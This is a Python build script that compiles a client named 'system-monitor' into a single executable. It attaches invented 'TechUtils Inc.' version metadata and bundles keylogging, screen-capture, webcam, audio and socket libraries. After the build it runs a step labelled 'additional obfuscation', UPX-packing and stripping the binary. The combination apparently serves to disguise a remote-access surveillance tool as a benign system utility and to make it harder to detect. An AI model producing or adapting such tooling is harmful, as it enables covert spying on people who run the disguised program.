#!/usr/bin/env python3

import os
import sys
import shutil
import platform
import subprocess
from pathlib import Path

APP_NAME = "system-monitor"
DISPLAY_NAME = "System Monitor Utility"
ENTRY = "client/client.py"
VERSION = "1.0.0"
COMPANY = "TechUtils Inc."
COPYRIGHT = "Copyright © 2024 TechUtils Inc."

print("Detecting OS...")
system = platform.system().lower()

if system == "linux":
    PLATFORM = "linux"
    EXT = ""
elif system == "darwin":
    PLATFORM = "macos"
    EXT = ""
elif system == "windows":
    PLATFORM = "windows"
    EXT = ".exe"
else:
    print(f"Unsupported OS: {system}")
    sys.exit(1)

print(f"OS detected: {PLATFORM}")

# -----------------------------
# Clean previous builds
# -----------------------------
print("Cleaning previous builds...")

for folder in ["build", "dist"]:
    if os.path.exists(folder):
        shutil.rmtree(folder)

# Remove .spec files
for file in Path(".").glob("*.spec"):
    file.unlink()

# -----------------------------
# Create version file (Windows)
# -----------------------------
version_file = "version_info.txt"

if PLATFORM == "windows":
    print("Creating version info file for Windows...")
    with open(version_file, "w", encoding="utf-8") as f:
        f.write(f"""VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=({VERSION}),
    prodvers=({VERSION}),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'{COMPANY}'),
        StringStruct(u'FileDescription', u'{DISPLAY_NAME}'),
        StringStruct(u'FileVersion', u'{VERSION}'),
        StringStruct(u'InternalName', u'sysmon'),
        StringStruct(u'LegalCopyright', u'{COPYRIGHT}'),
        StringStruct(u'OriginalFilename', u'sysmon.exe'),
        StringStruct(u'ProductName', u'{DISPLAY_NAME}'),
        StringStruct(u'ProductVersion', u'{VERSION}')])
      ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
""")

# -----------------------------
# Build with PyInstaller
# -----------------------------
print("Building executable...")

pyinstaller_args = [
    ENTRY,
    "--name", APP_NAME,
    "--onefile",
    "--clean",
    "--noconfirm",
    "--hidden-import=cv2",
    "--hidden-import=pynput",
    "--hidden-import=mss",
    "--hidden-import=netifaces",
    "--hidden-import=cryptography",
    "--hidden-import=json",
    "--hidden-import=base64",
    "--hidden-import=uuid",
    "--hidden-import=datetime",
    "--hidden-import=time",
    "--hidden-import=threading",
    "--hidden-import=queue",
    "--hidden-import=pyaudio",
    "--hidden-import=PIL",
    "--hidden-import=select",
    "--hidden-import=socket",
    "--hidden-import=sys",
    "--hidden-import=logging",
    "--hidden-import=logging.handlers",
    "--hidden-import=logging.config",
    "--strip",
    "--noupx"
]

if PLATFORM == "windows" and os.path.exists(version_file):
    pyinstaller_args.append(f"--version-file={version_file}")

# Run via Poetry
cmd = ["poetry", "run", "pyinstaller"] + pyinstaller_args

result = subprocess.run(cmd)
if result.returncode != 0:
    print("❌ Build failed")
    sys.exit(1)

# -----------------------------
# Post-processing
# -----------------------------
output = os.path.join("dist", APP_NAME + EXT)

if os.path.exists(output):
    print("Applying additional obfuscation...")

    # UPX compression
    try:
        if PLATFORM != "macos":
            subprocess.run(["upx", "--best", "--ultra-brute", output], check=True)
            print("UPX packing done")
        else:
            print("UPX not supported on macOS, skipping")
    except Exception:
        print("UPX not available or failed, continuing")

    # Strip (Linux only)
    if PLATFORM == "linux":
        try:
            subprocess.run(["strip", output], check=True)
            print("Stripping done")
        except Exception:
            print("Strip failed, continuing")

    size = os.path.getsize(output) / (1024 * 1024)
    print("\n✅ Build complete!")
    print(f"Executable: {output}")
    print(f"Size: {size:.2f} MB")
else:
    print("⚠️ Build finished but executable not found")
    sys.exit(1)